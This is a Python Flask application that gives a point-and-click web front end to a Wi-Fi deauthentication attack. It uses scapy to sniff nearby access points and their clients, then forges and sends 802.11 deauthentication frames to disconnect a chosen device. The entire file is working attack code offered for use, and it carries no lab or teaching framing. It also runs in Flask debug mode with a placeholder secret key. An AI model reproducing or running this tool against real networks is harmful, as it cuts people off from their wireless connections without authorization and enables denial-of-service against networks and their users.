from flask import Flask, render_template, request, redirect, url_for, flash, jsonify
from scapy.all import *
import warnings

# Suppress deprecation warnings
warnings.filterwarnings("ignore", category=DeprecationWarning)

app = Flask(__name__)
app.secret_key = 'your_secret_key'

def scan_for_aps(interface):
    print("Scanning for Access Points...")
    aps = []
    
    def sniff_ap(pkt):
        if pkt.haslayer(Dot11Beacon):
            ap_mac = pkt[Dot11].addr2
            if ap_mac not in aps:
                aps.append(ap_mac)
                print(f"Discovered AP: {ap_mac}")
    
    try:
        sniff(iface=interface, prn=sniff_ap, timeout=10, count=0)
    except Exception as e:
        print(f"Error during sniffing: {e}")
    
    return aps

def scan_for_clients(interface, ap_mac):
    print(f"Scanning for clients connected to AP: {ap_mac}")
    clients = []
    
    def sniff_client(pkt):
        if pkt.haslayer(Dot11ProbeResp) and pkt[Dot11].addr3 == ap_mac:
            client_mac = pkt[Dot11].addr2
            if client_mac not in clients:
                clients.append(client_mac)
                print(f"Discovered Client: {client_mac}")
    
    try:
        sniff(iface=interface, prn=sniff_client, timeout=10, count=0)
    except Exception as e:
        print(f"Error during sniffing: {e}")
    
    return clients

def deauth_packet(ap_mac, client_mac):
    packet = RadioTap()/Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac)/Dot11Deauth(reason=7)
    return packet

def send_deauth_packets(interface, ap_mac, client_mac, count):
    packet = deauth_packet(ap_mac, client_mac)
    print(f"Sending {count} deauthentication packets to {client_mac}...")
    try:
        sendp(packet, iface=interface, count=count, inter=0.1)
        return True
    except Exception as e:
        print(f"Error sending packets: {e}")
        return False

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        interface = request.form.get('interface')
        if not interface:
            flash('Please enter a network interface!', 'danger')
            return redirect(url_for('index'))

        aps = scan_for_aps(interface)
        return render_template('index.html', aps=aps, interface=interface)

    return render_template('index.html', aps=None, interface=None)

@app.route('/scan_clients', methods=['POST'])
def scan_clients():
    interface = request.form.get('interface')
    ap_mac = request.form.get('ap_mac')
    
    if not ap_mac:
        flash('Please select an Access Point (AP)!', 'danger')
        return redirect(url_for('index'))

    clients = scan_for_clients(interface, ap_mac)
    return jsonify(clients=clients)

@app.route('/deauth', methods=['POST'])
def deauth():
    interface = request.form.get('interface')
    ap_mac = request.form.get('ap_mac')
    client_mac = request.form.get('client_mac')
    
    if not client_mac:
        flash('Please select a Client!', 'danger')
        return redirect(url_for('index'))

    success = send_deauth_packets(interface, ap_mac, client_mac, 10)
    if success:
        flash(f'Deauthentication packets sent to {client_mac} successfully!', 'success')
    else:
        flash('Failed to send deauthentication packets!', 'danger')

    return redirect(url_for('index'))

if __name__ == '__main__':
    app.run(debug=True)
